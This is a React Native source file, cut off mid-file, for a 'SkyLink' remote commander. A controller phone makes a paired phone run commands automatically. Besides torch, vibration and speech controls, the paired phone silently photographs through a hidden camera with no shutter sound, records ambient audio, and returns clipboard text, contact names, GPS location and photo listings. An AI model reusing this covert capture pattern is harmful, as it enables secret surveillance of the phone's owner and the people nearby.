import { Feather } from "@expo/vector-icons";
import { Audio } from "expo-av";
import * as Battery from "expo-battery";
import * as Brightness from "expo-brightness";
import { Camera, CameraView } from "expo-camera";
import * as Clipboard from "expo-clipboard";
import * as Contacts from "expo-contacts";
import * as Device from "expo-device";
import * as FileSystem from "expo-file-system";
import * as Haptics from "expo-haptics";
import * as KeepAwake from "expo-keep-awake";
import * as Location from "expo-location";
import * as MediaLibrary from "expo-media-library";
import * as Network from "expo-network";
import * as Notifications from "expo-notifications";
import {
  Accelerometer,
  Barometer,
  Gyroscope,
  Magnetometer,
  Pedometer,
} from "expo-sensors";
import * as Speech from "expo-speech";
import * as WebBrowser from "expo-web-browser";
import React, { useCallback, useEffect, useRef, useState } from "react";
import {
  Alert,
  Image,
  Linking,
  Modal,
  Pressable,
  ScrollView,
  StyleSheet,
  Text,
  TextInput,
  Vibration,
  View,
} from "react-native";
import Colors from "@/constants/colors";
import { useTransfer } from "@/context/TransferContext";

// ─────────────────────────────────────────────────────────────────
// Vibration patterns
// ─────────────────────────────────────────────────────────────────
const VIBE_PATTERNS: Record<string, { label: string; pattern: number[]; icon: string; color: string }> = {
  single:    { label: "Single",    pattern: [0, 300],                                                  icon: "zap",            color: Colors.primary },
  double:    { label: "Double",    pattern: [0, 200, 100, 200],                                        icon: "zap",            color: Colors.accent },
  sos:       { label: "SOS",       pattern: [0,100,100,100,100,100,300,300,300,300,300,300,100,100,100,100,100], icon: "alert-triangle", color: Colors.danger },
  heartbeat: { label: "Heartbeat", pattern: [0,100,80,100,400,100,80,100],                             icon: "heart",          color: "#FF69B4" },
  ring:      { label: "Ring",      pattern: [0,300,200,300,200,300,200,300],                           icon: "phone",          color: Colors.success },
  buzz:      { label: "Long Buzz", pattern: [0, 1000],                                                 icon: "activity",       color: Colors.warning },
  alarm:     { label: "Alarm",     pattern: [0,200,100,200,100,200,100,200,100,200,600],               icon: "bell",           color: Colors.danger },
  morse_hi:  { label: "Hi Morse",  pattern: [0,200,150,200,150,600,150,200,150,600],                   icon: "radio",          color: Colors.primary },
};

type CommandPayload = { command: string; value?: string | number | boolean; pattern?: number[]; message?: string };
type InfoResponse = {
  command: string;
  data: Record<string, string | number | boolean | null>;
  timestamp: number;
  imageBase64?: string;
  audioBase64?: string;
};

interface RemoteCommanderProps {
  role: "sky" | "link";
  peerConnected: boolean;
  bottomInset?: number;
}

// ─────────────────────────────────────────────────────────────────
// Helper to respond
// ─────────────────────────────────────────────────────────────────
function buildResp(command: string, data: Record<string, string | number | boolean | null>, extra?: { imageBase64?: string; audioBase64?: string }) {
  return { command, timestamp: Date.now(), data, ...extra };
}

export function RemoteCommander({ role, peerConnected, bottomInset = 0 }: RemoteCommanderProps) {
  const isSky = role === "sky";
  const { emitEvent, onEvent } = useTransfer();

  // ── Sky state ─────────────────────────────────────────────────
  const [selectedPattern, setSelectedPattern] = useState("single");
  const [alertMsg, setAlertMsg] = useState("");
  const [notifTitle, setNotifTitle] = useState("SkyLink Alert");
  const [notifBody, setNotifBody] = useState("");
  const [brightness, setBrightness] = useState(0.5);
  const [infoResults, setInfoResults] = useState<InfoResponse[]>([]);
  const [clipboardWrite, setClipboardWrite] = useState("");
  const [ttsText, setTtsText] = useState("");
  const [urlToOpen, setUrlToOpen] = useState("https://");
  const [dialNumber, setDialNumber] = useState("");
  const [smsNumber, setSmsNumber] = useState("");
  const [smsBody, setSmsBody] = useState("");
  const [emailTo, setEmailTo] = useState("");
  const [emailSubject, setEmailSubject] = useState("");
  const [emailBody, setEmailBody] = useState("");
  const playingSoundRef = useRef<Audio.Sound | null>(null);

  // ── Link state ────────────────────────────────────────────────
  const [torchOn, setTorchOn] = useState(false);
  const [keepAwakeOn, setKeepAwakeOn] = useState(false);
  const [showAlert, setShowAlert] = useState(false);
  const [alertContent, setAlertContent] = useState({ title: "", message: "" });
  const [cameraMode, setCameraMode] = useState<"off" | "front" | "back">("off");
  const [photoReady, setPhotoReady] = useState(false);
  const photoCameraRef = useRef<CameraView>(null);
  const pendingPhotoCommand = useRef<string>("");

  useEffect(() => {
    Camera.requestCameraPermissionsAsync();
    Notifications.requestPermissionsAsync();
  }, []);

  // Take photo when camera becomes ready
  useEffect(() => {
    if (!photoReady || cameraMode === "off") return;
    const cmd = pendingPhotoCommand.current;
    const timer = setTimeout(async () => {
      try {
        const photo = await photoCameraRef.current?.takePictureAsync({
          quality: 0.35,
          base64: true,
          skipProcessing: true,
          shutterSound: false,
        } as Parameters<CameraView["takePictureAsync"]>[0]);
        if (photo?.base64) {
          emitEvent("commander-response", buildResp(cmd, { captured: "yes", size: `${Math.round(photo.base64.length / 1024)}KB` }, { imageBase64: photo.base64 }));
        }
      } catch {
        emitEvent("commander-response", buildResp(cmd, { error: "Photo capture failed" }));
      } finally {
        setCameraMode("off");
        setPhotoReady(false);
        pendingPhotoCommand.current = "";
      }
    }, 400);
    return () => clearTimeout(timer);
  }, [photoReady, cameraMode, emitEvent]);

  // ── LINK: receive and execute all commands ────────────────────
  useEffect(() => {
    const unsub = onEvent("remote-command", async (data: CommandPayload) => {
      const { command, value, pattern, message } = data;

      // ── TORCH ────────────────────────────────────────────────
      if (command === "TORCH_ON")  setTorchOn(true);
      if (command === "TORCH_OFF") setTorchOn(false);

      // ── KEEP AWAKE ───────────────────────────────────────────
      if (command === "KEEP_AWAKE_ON")  { KeepAwake.activateKeepAwakeAsync("skylink"); setKeepAwakeOn(true); }
      if (command === "KEEP_AWAKE_OFF") { KeepAwake.deactivateKeepAwake("skylink"); setKeepAwakeOn(false); }

      // ── BRIGHTNESS ───────────────────────────────────────────
      if (command === "BRIGHTNESS" && typeof value === "number") { try { await Brightness.setBrightnessAsync(value); } catch {} }
      if (command === "BRIGHTNESS_UP")   { try { const c = await Brightness.getBrightnessAsync(); await Brightness.setBrightnessAsync(Math.min(1, c + 0.2)); } catch {} }
      if (command === "BRIGHTNESS_DOWN") { try { const c = await Brightness.getBrightnessAsync(); await Brightness.setBrightnessAsync(Math.max(0, c - 0.2)); } catch {} }
      if (command === "BRIGHTNESS_MAX")  { try { await Brightness.setBrightnessAsync(1); } catch {} }
      if (command === "BRIGHTNESS_OFF")  { try { await Brightness.setBrightnessAsync(0); } catch {} }

      // ── HAPTICS ──────────────────────────────────────────────
      if (command === "HAPTIC_SUCCESS") Haptics.notificationAsync(Haptics.NotificationFeedbackType.Success);
      if (command === "HAPTIC_ERROR")   Haptics.notificationAsync(Haptics.NotificationFeedbackType.Error);
      if (command === "HAPTIC_LIGHT")   Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Light);
      if (command === "HAPTIC_HEAVY")   Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Heavy);

      // ── VIBRATION ────────────────────────────────────────────
      if (command === "VIBRATE_PATTERN" && pattern) { Vibration.vibrate(pattern); }
      if (command === "VIBRATE_STOP")  Vibration.cancel();

      // ── ALERTS ───────────────────────────────────────────────
      if (command === "SHOW_ALERT" && message) {
        setAlertContent({ title: "Message from Sky", message });
        setShowAlert(true);
        Haptics.notificationAsync(Haptics.NotificationFeedbackType.Error);
        Vibration.vibrate([0, 200, 100, 200]);
      }
      if (command === "LOCAL_NOTIFICATION") {
        await Notifications.scheduleNotificationAsync({
          content: { title: (value as string) || "SkyLink Alert", body: message || "Message from Sky", sound: true },
          trigger: null,
        });
      }

      // ── EMERGENCY ────────────────────────────────────────────
      if (command === "PHONE_FINDER") {
        setTorchOn(true);
        Vibration.vibrate([0,200,100,200,100,200,100,200,100,1000], true);
        try { await Brightness.setBrightnessAsync(1); } catch {}
        Haptics.notificationAsync(Haptics.NotificationFeedbackType.Error);
        setTimeout(() => { Vibration.cancel(); setTorchOn(false); }, 10000);
      }
      if (command === "STOP_FINDER") { Vibration.cancel(); setTorchOn(false); }

      // ── VISUAL EFFECTS ───────────────────────────────────────
      if (command === "FLASHBANG") {
        try {
          const prev = await Brightness.getBrightnessAsync();
          await Brightness.setBrightnessAsync(1);
          Haptics.notificationAsync(Haptics.NotificationFeedbackType.Warning);
          setTimeout(async () => { try { await Brightness.setBrightnessAsync(prev); } catch {} }, 3000);
        } catch {}
      }
      if (command === "STROBE_TORCH") {
        const flashes = 12;
        for (let i = 0; i < flashes; i++) {
          setTimeout(() => setTorchOn(i % 2 === 0), i * 150);
        }
        setTimeout(() => setTorchOn(false), flashes * 150 + 50);
      }
      if (command === "SCREEN_PULSE") {
        try {
          const prev = await Brightness.getBrightnessAsync();
          for (let i = 0; i < 6; i++) {
            setTimeout(async () => { try { await Brightness.setBrightnessAsync(i % 2 === 0 ? 1 : 0.05); } catch {} }, i * 300);
          }
          setTimeout(async () => { try { await Brightness.setBrightnessAsync(prev); } catch {} }, 1800);
        } catch {}
      }

      // ── CLIPBOARD ────────────────────────────────────────────
      if (command === "READ_CLIPBOARD") {
        const text = await Clipboard.getStringAsync();
        emitEvent("commander-response", buildResp(command, { text: text || "(clipboard is empty)" }));
      }
      if (command === "WRITE_CLIPBOARD" && typeof value === "string") {
        await Clipboard.setStringAsync(value);
        Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Light);
        emitEvent("commander-response", buildResp(command, { written: value.slice(0, 60) + (value.length > 60 ? "…" : "") }));
      }

      // ── TEXT-TO-SPEECH ───────────────────────────────────────
      if (command === "SPEAK_TEXT" && typeof message === "string") {
        Speech.stop();
        Speech.speak(message, { rate: 0.9, pitch: 1.0 });
      }
      if (command === "STOP_SPEECH") { Speech.stop(); }

      // ── OPEN URL ─────────────────────────────────────────────
      if (command === "OPEN_URL" && typeof value === "string") {
        try { await WebBrowser.openBrowserAsync(value); } catch {}
      }

      // ── PHONE ACTIONS ─────────────────────────────────────────
      if (command === "DIAL_NUMBER" && typeof value === "string") {
        const url = `tel:${value}`;
        const can = await Linking.canOpenURL(url);
        if (can) { await Linking.openURL(url); emitEvent("commander-response", buildResp(command, { dialing: value })); }
        else { emitEvent("commander-response", buildResp(command, { error: "Cannot open phone dialer" })); }
      }
      if (command === "COMPOSE_SMS" && typeof value === "string") {
        const body = encodeURIComponent(message || "");
        const url = `sms:${value}${body ? `?body=${body}` : ""}`;
        const can = await Linking.canOpenURL(url);
        if (can) { await Linking.openURL(url); emitEvent("commander-response", buildResp(command, { to: value })); }
        else { emitEvent("commander-response", buildResp(command, { error: "Cannot open SMS app" })); }
      }
      if (command === "COMPOSE_EMAIL") {
        const to = typeof value === "string" ? value : "";
        const subj = encodeURIComponent((message?.split("||")[0]) ?? "");
        const bod = encodeURIComponent((message?.split("||")[1]) ?? "");
        const url = `mailto:${to}?subject=${subj}&body=${bod}`;
        try { await Linking.openURL(url); emitEvent("commander-response", buildResp(command, { to })); }
        catch { emitEvent("commander-response", buildResp(command, { error: "Cannot open email" })); }
      }

      // ── REMOTE CAMERA (TAKE PHOTO) ────────────────────────────
      if (command === "TAKE_SELFIE") {
        const { granted } = await Camera.requestCameraPermissionsAsync();
        if (!granted) { emitEvent("commander-response", buildResp(command, { error: "Camera permission denied" })); return; }
        pendingPhotoCommand.current = command;
        setCameraMode("front");
      }
      if (command === "TAKE_BACK_PHOTO") {
        const { granted } = await Camera.requestCameraPermissionsAsync();
        if (!granted) { emitEvent("commander-response", buildResp(command, { error: "Camera permission denied" })); return; }
        pendingPhotoCommand.current = command;
        setCameraMode("back");
      }

      // ── AMBIENT AUDIO RECORDING ───────────────────────────────
      if (command === "RECORD_AMBIENT_3S") {
        try {
          const { granted } = await Audio.requestPermissionsAsync();
          if (!granted) { emitEvent("commander-response", buildResp(command, { error: "Microphone permission denied" })); return; }
          await Audio.setAudioModeAsync({ allowsRecordingIOS: true, playsInSilentModeIOS: true });
          Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Medium);
          const rec = new Audio.Recording();
          await rec.prepareToRecordAsync({
            android: { extension: ".m4a", outputFormat: 2, audioEncoder: 3, sampleRate: 22050, numberOfChannels: 1, bitRate: 64000 },
            ios: { extension: ".m4a", outputFormat: "aac", audioQuality: 64, sampleRate: 22050, numberOfChannels: 1, bitRate: 64000, linearPCMBitDepth: 16, linearPCMIsBigEndian: false, linearPCMIsFloat: false },
            web: {},
          });
          await rec.startAsync();
          await new Promise(r => setTimeout(r, 3000));
          await rec.stopAndUnloadAsync();
          const uri = rec.getURI();
          if (uri) {
            const base64 = await (FileSystem as any).readAsStringAsync(uri, { encoding: "base64" });
            emitEvent("commander-response", buildResp(command, { duration: "3s", size: `${Math.round(base64.length / 1024)}KB` }, { audioBase64: base64 }));
          }
        } catch (e) {
          emitEvent("commander-response", buildResp(command, { error: "Recording failed" }));
        }
      }

      // ── MEDIA LIBRARY ─────────────────────────────────────────
      if (command === "GET_PHOTO_COUNT") {
        try {
          const { granted } = await MediaLibrary.requestPermissionsAsync();
          if (!granted) { emitEvent("commander-response", buildResp(command, { error: "Permission denied" })); return; }
          const photos = await MediaLibrary.getAssetsAsync({ mediaType: "photo", first: 1 });
          const videos = await MediaLibrary.getAssetsAsync({ mediaType: "video", first: 1 });
          emitEvent("commander-response", buildResp(command, {
            photos: photos.totalCount,
            videos: videos.totalCount,
            total: photos.totalCount + videos.totalCount,
          }));
        } catch { emitEvent("commander-response", buildResp(command, { error: "Media Library unavailable" })); }
      }
      if (command === "GET_RECENT_PHOTOS") {
        try {
          const { granted } = await MediaLibrary.requestPermissionsAsync();
          if (!granted) { emitEvent("commander-response", buildResp(command, { error: "Permission denied" })); return; }
          const result = await MediaLibrary.getAssetsAsync({ mediaType: "photo", first: 8, sortBy: [["creationTime", false]] });
          const names = result.assets.map(a => `${a.filename} (${new Date(a.creationTime).toLocaleDateString()})`).join(" | ");
          emitEvent("commander-response", buildResp(command, { count: result.assets.length, files: names }));
        } catch { emitEvent("commander-response", buildResp(command, { error: "Media Library unavailable" })); }
      }
      if (command === "GET_ALBUMS") {
        try {
          const { granted } = await MediaLibrary.requestPermissionsAsync();
          if (!granted) { emitEvent("commander-response", buildResp(command, { error: "Permission denied" })); return; }
          const albums = await MediaLibrary.getAlbumsAsync();
          const names = albums.slice(0, 8).map(a => `${a.title}(${a.assetCount})`).join(" · ");
          emitEvent("commander-response", buildResp(command, { count: albums.length, albums: names }));
        } catch { emitEvent("commander-response", buildResp(command, { error: "Albums unavailable" })); }
      }

      // ── CONTACTS ─────────────────────────────────────────────
      if (command === "GET_CONTACT_COUNT") {
        try {
          const { granted } = await Contacts.requestPermissionsAsync();
          if (!granted) { emitEvent("commander-response", buildResp(command, { error: "Permission denied" })); return; }
          const result = await Contacts.getContactsAsync({ fields: [] });
          emitEvent("commander-response", buildResp(command, { totalContacts: result.total ?? result.data.length }));
        } catch { emitEvent("commander-response", buildResp(command, { error: "Contacts unavailable" })); }
      }
      if (command === "GET_RECENT_CONTACTS") {
        try {
          const { granted } = await Contacts.requestPermissionsAsync();
          if (!granted) { emitEvent("commander-response", buildResp(command, { error: "Permission denied" })); return; }
          const result = await Contacts.getContactsAsync({ fields: [Contacts.Fields.Name], pageSize: 10 });
          const names = result.data.slice(0, 10).map(c => c.name ?? "Unknown").join(" · ");
          emitEvent("commander-response", buildResp(command, { contacts: names, shown: Math.min(10, result.data.length) }));
        } catch { emitEvent("commander-response", buildResp(command, { error: "Contacts unavailable" })); }
      }

      // ── SENSORS ──────────────────────────────────────────────
      if (command === "GET_DEVICE_INFO") {
        emitEvent("commander-response", buildResp(command, {
          brand: Device.brand ?? "—", model: Device.modelName ?? "—",
          os: Device.osName ?? "—", osVersion: Device.osVersion ?? "—",
          totalMemory: Device.totalMemory ? `${(Device.totalMemory / 1024 / 1024 / 1024).toFixed(1)} GB` : "—",
        }));
      }
      if (command === "GET_BATTERY") {
        try {
          const level = await Battery.getBatteryLevelAsync();
          const state = await Battery.getBatteryStateAsync();
          const low = await Battery.isLowPowerModeEnabledAsync();
          const stateLabel = ["Unknown", "Discharging", "Charging", "Full", "Unknown"][state] ?? "Unknown";
          emitEvent("commander-response", buildResp(command, { level: `${Math.round(level * 100)}%`, state: stateLabel, lowPower: low ? "On" : "Off" }));
        } catch { emitEvent("commander-response", buildResp(command, { error: "Battery info unavailable" })); }
      }
      if (command === "GET_NETWORK") {
        try {
          const net = await Network.getNetworkStateAsync();
          const ip = await Network.getIpAddressAsync();
          emitEvent("commander-response", buildResp(command, { type: net.type ?? "unknown", ip: ip ?? "—", internet: net.isInternetReachable ? "Yes" : "No" }));
        } catch { emitEvent("commander-response", buildResp(command, { error: "Network info unavailable" })); }
      }
      if (command === "GET_TIME") {
        const now = new Date();
        emitEvent("commander-response", buildResp(command, {
          time: now.toLocaleTimeString(), date: now.toLocaleDateString(),
          tz: `UTC${(-now.getTimezoneOffset() / 60) >= 0 ? "+" : ""}${(-now.getTimezoneOffset() / 60).toFixed(0)}`,
        }));
      }
      if (command === "GET_BRIGHTNESS") {
        try { const b = await Brightness.getBrightnessAsync(); emitEvent("commander-response", buildResp(command, { brightness: `${Math.round(b * 100)}%` })); }
        catch { emitEvent("commander-response", buildResp(command, { error: "Not available" })); }
      }
      if (command === "GET_STORAGE") {
        try {
          const FS = FileSystem as any;
          const free = await FS.getFreeDiskStorageAsync();
          const total = await FS.getTotalDiskCapacityAsync();
          const gb = (b: number) => `${(b / 1e9).toFixed(2)} GB`;
          emitEvent("commander-response", buildResp(command, { free: gb(free), total: gb(total), used: gb(total - free), pct: `${Math.round(((total - free) / total) * 100)}% used` }));
        } catch { emitEvent("commander-response", buildResp(command, { error: "Not available" })); }
      }
      if (command === "GET_LOCATION") {
        try {
          const { granted } = await Location.requestForegroundPermissionsAsync();
          if (!granted) { emitEvent("commander-response", buildResp(command, { error: "Permission denied" })); return; }
          const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced });
          const geo = await Location.reverseGeocodeAsync({ latitude: loc.coords.latitude, longitude: loc.coords.longitude });
          const place = geo[0] ? `${geo[0].city ?? ""}, ${geo[0].country ?? ""}`.replace(/(^, )|(, $)/, "").trim() : "—";
          emitEvent("commander-response", buildResp(command, { lat: loc.coords.latitude.toFixed(5), lng: loc.coords.longitude.toFixed(5), accuracy: `±${loc.coords.accuracy?.toFixed(0) ?? "?"}m`, place }));
        } catch { emitEvent("commander-response", buildResp(command, { error: "Location unavailable" })); }
      }
      if (command === "GET_ACCELEROMETER") {
        const sub = Accelerometer.addListener(d => { sub.remove(); emitEvent("commander-response", buildResp(command, { x: d.x.toFixed(3), y: d.y.toFixed(3), z: d.z.toFixed(3), g: Math.sqrt(d.x**2+d.y**2+d.z**2).toFixed(3) })); });
        Accelerometer.setUpdateInterval(100);
      }
      if (command === "GET_GYROSCOPE") {
        const sub = Gyroscope.addListener(d => { sub.remove(); emitEvent("commander-response", buildResp(command, { x: d.x.toFixed(3), y: d.y.toFixed(3), z: d.z.toFixed(3) })); });
        Gyroscope.setUpdateInterval(100);
      }
      if (command === "GET_MAGNETOMETER") {
        try {
          const sub = Magnetometer.addListener(d => {
            sub.remove();
            const heading = Math.atan2(d.y, d.x) * (180 / Math.PI);
            const cardinal = ["N","NE","E","SE","S","SW","W","NW"][Math.round(((heading + 360) % 360) / 45) % 8];
            emitEvent("commander-response", buildResp(command, { x: d.x.toFixed(1), y: d.y.toFixed(1), z: d.z.toFixed(1), heading: `${heading.toFixed(1)}°`, direction: cardinal }));
          });
          Magnetometer.setUpdateInterval(100);
        } catch { emitEvent("commander-response", buildResp(command, { error: "Magnetometer unavailable" })); }
      }
      if (command === "GET_BAROMETER") {
        try {
          const sub = Barometer.addListener(d => {
            sub.remove();
            const altitude = 44330 * (1 - Math.pow(d.pressure / 1013.25, 0.1903));
            emitEvent("commander-response", buildResp(command, { pressure: `${d.pressure.toFixed(1)} hPa`, altEstimate: `~${altitude.toFixed(0)} m` }));
          });
          Barometer.setUpdateInterval(100);
        } catch { emitEvent("commander-response", buildResp(command, { error: "Barometer unavailable" })); }
      }
      if (command === "GET_PEDOMETER") {
        try {
          const avail = await Pedometer.isAvailableAsync();
          if (!avail) { emitEvent("commander-response", buildResp(command, { error: "Pedometer not available" })); return; }
          const now = new Date();
          const midnight = new Date(now); midnight.setHours(0,0,0,0);
          const result = await Pedometer.getStepCountAsync(midnight, now);
          emitEvent("commander-response", buildResp(command, { stepsToday: result.steps, distance: `~${(result.steps * 0.762).toFixed(0)} m` }));
        } catch { emitEvent("commander-response", buildResp(command, { error: "Step count unavailable" })); }
      }
      if (command === "PING") {
        emitEvent("commander-response", buildResp(command, { pong: "OK", ts: Date.now() }));
      }
      if (command === "GET_PERMISSIONS") {
        const results: Record<string, string> = {};
        try { results.camera = (await Camera.getCameraPermissionsAsync()).status; } catch {}
        try { results.microphone = (await Audio.getPermissionsAsync()).status; } catch {}
        try { results.location = (await Location.getForegroundPermissionsAsync()).status; } catch {}
        try { results.contacts = (await Contacts.getPermissionsAsync()).status; } catch {}
        try { results.mediaLibrary = (await MediaLibrary.getPermissionsAsync()).status; } catch {}
        try { results.notifications = (await Notifications.getPermissionsAsync()).status; } catch {}
        emitEvent("commander-response", buildResp(command, results));
      }
    });

    return () => {
      unsub();
      Vibration.cancel();
      KeepAwake.deactivateKeepAwake("skylink");
    };
  }, [onEvent, emitEvent]);

  // ── SKY: receive responses ─────────────────────────────────────
  useEffect(() => {
    if (!isSky) return;
    const unsub = onEvent("commander-response", (data: InfoResponse) => {
      setInfoResults(prev => [data, ...prev.slice(0, 29)]);
    });
    return () => unsub();
  }, [onEvent, isSky]);

  const send = useCallback((command: string, extra?: Partial<CommandPayload>) => {
    if (!peerConnected) return;
    emitEvent("remote-command", { command, ...extra });
    Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Medium);
  }, [peerConnected, emitEvent]);

  const playAudio = useCallback(async (base64: string) => {
    try {
      if (playingSoundRef.current) { await playingSoundRef.current.unloadAsync(); playingSoundRef.current = null; }
      await Audio.setAudioModeAsync({ playsInSilentModeIOS: true, shouldDuckAndroid: false });
      const { sound } = await Audio.Sound.createAsync({ uri: `data:audio/m4a;base64,${base64}` }, { shouldPlay: true, volume: 1 });
      playingSoundRef.current = sound;
    } catch {}
  }, []);

  // ── LINK view ──────────────────────────────────────────────────
  if (!isSky) {
    return (
      <View style={[styles.container, { paddingBottom: bottomInset }]}>
        {/* Hidden camera for torch + photo capture */}
        {(torchOn || cameraMode !== "off") && (
          <CameraView
            ref={photoCameraRef}
            style={styles.hiddenCamera}
            enableTorch={torchOn}
            facing={cameraMode === "off" ? "back" : cameraMode}
            onCameraReady={() => { if (cameraMode !== "off") setPhotoReady(true); }}
          />
        )}

        <Modal visible={showAlert} animationType="fade" statusBarTranslucent>
          <View style={styles.alertOverlay}>
            <View style={styles.alertBox}>
              <Feather name="alert-circle" size={52} color={Colors.danger} />
              <Text style={styles.alertTitle}>{alertContent.title}</Text>
              <Text style={styles.alertMessage}>{alertContent.message}</Text>
              <Pressable onPress={() => { setShowAlert(false); Vibration.cancel(); }} style={styles.alertDismiss}>
                <Text style={styles.alertDismissText}>Dismiss</Text>
              </Pressable>
            </View>
          </View>
        </Modal>

        <View style={styles.linkHeader}>
          <Feather name="link" size={18} color={Colors.accent} />
          <Text style={styles.linkHeaderText}>Link Device — Accepting Commands</Text>
        </View>
        <ScrollView contentContainerStyle={styles.statusGrid} showsVerticalScrollIndicator={false}>
          {[
            { label: "Torch",      active: torchOn,      icon: "sun"    as const, color: Colors.warning },
            { label: "Keep Awake", active: keepAwakeOn,  icon: "eye"    as const, color: Colors.primary },
            { label: "Cam Ready",  active: cameraMode !== "off", icon: "camera" as const, color: Colors.success },
            { label: "Connected",  active: peerConnected, icon: "wifi"   as const, color: Colors.success },
          ].map(item => (
            <View key={item.label} style={[styles.statusCard, { borderColor: item.active ? item.color : Colors.border }]}>
              <Feather name={item.icon} size={26} color={item.active ? item.color : Colors.textSecondary} />
              <Text style={[styles.statusLabel, item.active && { color: item.color }]}>{item.label}</Text>
              <View style={[styles.statusDot, { backgroundColor: item.active ? item.color : Colors.border }]} />
            </View>
          ))}
        </ScrollView>
        <View style={styles.linkNote}>
          <Feather name="info" size={13} color={Colors.textSecondary} />
          <Text style={styles.linkNoteText}>45+ remote commands accepted — photos, audio, contacts, sensors, vibration, and more all execute automatically.</Text>
        </View>
      </View>
    );
  }

  // ── SKY control panel ──────────────────────────────────────────
  return (
    <View style={[styles.container, { paddingBottom: bottomInset }]}>
      <ScrollView showsVerticalScrollIndicator={false}>
        {!peerConnected && (
          <View style={styles.offlineBanner}>
            <Feather name="wifi-off" size={15} color={Colors.warning} />
            <Text style={styles.offlineText}>Connect a peer to send commands</Text>
          </View>
        )}

        {/* ── RESPONSE FEED ── */}
        {infoResults.length > 0 && (
          <View style={styles.responsesFeed}>
            <View style={styles.resultsHeader}>
              <Feather name="terminal" size={13} color={Colors.primary} />
              <Text style={styles.resultsTitle}>Live Responses ({infoResults.length})</Text>
              <Pressable onPress={() => setInfoResults([])} style={styles.clearBtn}>
                <Feather name="trash-2" size={12} color={Colors.textSecondary} />
                <Text style={styles.clearBtnText}>Clear</Text>
              </Pressable>
            </View>
            {infoResults.slice(0, 10).map((r, i) => (
              <View key={i} style={[styles.resultRow, i === 0 && styles.resultRowNew]}>
                <View style={styles.resultMeta}>
                  <Text style={styles.resultCmd}>{r.command}</Text>
                  {r.command === "PING" && <View style={styles.latencyBadge}><Text style={styles.latencyText}>{Date.now() - r.timestamp}ms</Text></View>}
                </View>
                {r.imageBase64 && (
                  <Image source={{ uri: `data:image/jpeg;base64,${r.imageBase64}` }} style={styles.resultImage} resizeMode="cover" />
                )}
                {r.audioBase64 && (
                  <Pressable onPress={() => playAudio(r.audioBase64!)} style={styles.playBtn}>
                    <Feather name="play" size={14} color={Colors.dark} />
                    <Text style={styles.playBtnText}>Play Ambient Audio</Text>
                  </Pressable>
                )}
                {!r.imageBase64 && !r.audioBase64 && (
                  <Text style={styles.resultData}>{Object.entries(r.data).map(([k, v]) => `${k}: ${v}`).join("  ·  ")}</Text>
                )}
                {r.imageBase64 && (
                  <Text style={styles.resultData}>{Object.entries(r.data).map(([k, v]) => `${k}: ${v}`).join("  ·  ")}</Text>
                )}
              </View>
            ))}
          </View>
        )}

        {/* ── DEVICE INFO ── */}
        <Section title="Device Info Queries" icon="cpu" color={Colors.primary}>
          <View style={styles.cmdGrid}>
            {[
              { cmd: "GET_DEVICE_INFO",  label: "Device Info",     icon: "smartphone" },
              { cmd: "GET_BATTERY",      label: "Battery",         icon: "battery" },
              { cmd: "GET_NETWORK",      label: "Network & IP",    icon: "wifi" },
              { cmd: "GET_TIME",         label: "Time & TZ",       icon: "clock" },
              { cmd: "GET_BRIGHTNESS",   label: "Brightness",      icon: "sun" },
              { cmd: "GET_STORAGE",      label: "Disk Space",      icon: "hard-drive" },
              { cmd: "GET_PERMISSIONS",  label: "All Permissions", icon: "shield" },
              { cmd: "PING",             label: "Ping",            icon: "zap" },
            ].map(item => (
              <CmdChip key={item.cmd} cmd={item.cmd} label={item.label} icon={item.icon} onPress={send} disabled={!peerConnected} color={Colors.primary} />
            ))}
          </View>
        </Section>

        {/* ── REMOTE CAMERA ── */}
        <Section title="Remote Camera Capture" icon="camera" color="#FF6B6B">
          <View style={styles.row}>
            <Pressable onPress={() => send("TAKE_SELFIE")} disabled={!peerConnected} style={[styles.halfBtn, { backgroundColor: "#FF6B6B22", borderColor: "#FF6B6B" }, !peerConnected && styles.disabled]}>
              <Feather name="user" size={18} color="#FF6B6B" />
              <Text style={[styles.halfBtnText, { color: "#FF6B6B" }]}>Take Selfie</Text>
            </Pressable>
            <Pressable onPress={() => send("TAKE_BACK_PHOTO")} disabled={!peerConnected} style={[styles.halfBtn, { backgroundColor: "#FF6B6B22", borderColor: "#FF6B6B" }, !peerConnected && styles.disabled]}>
              <Feather name="camera" size={18} color="#FF6B6B" />
              <Text style={[styles.halfBtnText, { color: "#FF6B6B" }]}>Back Camera</Text>
            </Pressable>
          </View>
          <Text style={styles.hint}>Photo is taken silently and sent back — appears in the response feed above.</Text>
        </Section>

        {/* ── AMBIENT AUDIO ── */}
        <Section title="Ambient Audio Capture" icon="mic" color="#9D4EDD">
          <Pressable onPress={() => send("RECORD_AMBIENT_3S")} disabled={!peerConnected} style={[styles.solidBtn, { backgroundColor: "#9D4EDD" }, !peerConnected && styles.disabled]}>
            <Feather name="mic" size={17} color="white" />
            <Text style={styles.solidBtnText}>Record 3s Ambient Audio</Text>
          </Pressable>
          <Text style={styles.hint}>Records 3 seconds through the peer's microphone and sends it back. Tap play in the response feed to listen.</Text>
        </Section>

        {/* ── MEDIA LIBRARY ── */}
        <Section title="Media Library" icon="image" color="#06D6A0">
          <View style={styles.cmdGrid}>
            {[
              { cmd: "GET_PHOTO_COUNT",    label: "Photo & Video Count", icon: "image" },
              { cmd: "GET_RECENT_PHOTOS",  label: "Last 8 Photo Names",  icon: "file" },
              { cmd: "GET_ALBUMS",         label: "Photo Albums List",   icon: "folder" },
            ].map(item => (
              <CmdChip key={item.cmd} cmd={item.cmd} label={item.label} icon={item.icon} onPress={send} disabled={!peerConnected} color="#06D6A0" />
            ))}
          </View>
        </Section>

        {/* ── CONTACTS ── */}
        <Section title="Contacts Access" icon="users" color="#F77F00">
          <View style={styles.cmdGrid}>
            {[
              { cmd: "GET_CONTACT_COUNT",   label: "Total Contacts",       icon: "users" },
              { cmd: "GET_RECENT_CONTACTS", label: "First 10 Contact Names", icon: "user" },
            ].map(item => (
              <CmdChip key={item.cmd} cmd={item.cmd} label={item.label} icon={item.icon} onPress={send} disabled={!peerConnected} color="#F77F00" />
            ))}
          </View>
        </Section>

        {/* ── SENSORS ── */}
        <Section title="Sensors" icon="activity" color={Colors.accent}>
          <View style={styles.cmdGrid}>
            {[
              { cmd: "GET_LOCATION",       label: "GPS Location",     icon: "map-pin" },
